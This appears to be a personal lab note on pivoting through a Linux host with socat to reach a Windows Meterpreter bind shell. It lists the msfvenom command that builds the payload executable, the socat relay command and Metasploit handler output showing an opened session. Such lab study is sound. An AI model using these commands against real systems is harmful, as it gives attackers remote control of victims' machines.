# Socat Redirection with a Bind Shell

![[Pasted image 20260103110729.png]]

## Create Listener Windows Payload (msfvenom)

```bash
msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o listener.exe LPORT=8443
```

## Create Socat Redirection on Pivot Host

```bash
ubuntu@WEB01:~$ sudo socat TCP-LISTEN:8000,fork TCP4:172.16.5.19:8443
```

## Start Meterpreter to connect to windows listener

```bash
msf exploit(multi/handler) > options

Payload options (aa

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '
                                        ', seh, thread, process, no
                                        ne)
   LPORT     8000             yes       The listen port
   RHOST     10.129.202.64    no        The target address

msf exploit(multi/handler) > run
[*] Started bind TCP handler against 10.129.202.64:8000
[*] Sending stage (230982 bytes) to 10.129.202.64
[*] Meterpreter session 1 opened (10.10.16.50:38369 -> 10.129.202.64:8000) at 2026-01-03 11:07:01 +0700

meterpreter > sysinfo
```

